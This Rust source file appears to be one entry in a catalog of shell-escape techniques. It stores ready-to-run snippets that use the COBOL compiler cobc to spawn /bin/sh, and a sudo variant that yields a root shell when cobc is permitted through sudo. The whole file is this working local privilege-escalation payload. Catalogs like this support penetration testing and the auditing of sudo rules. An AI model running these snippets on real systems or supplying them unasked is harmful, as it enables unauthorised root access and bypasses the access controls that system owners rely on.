
pub static BIN_NAME: &'static str = "cobc";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
    cobc -xFj --frelax-syntax-checks $TF/x
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
    sudo cobc -xFj --frelax-syntax-checks $TF/x
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
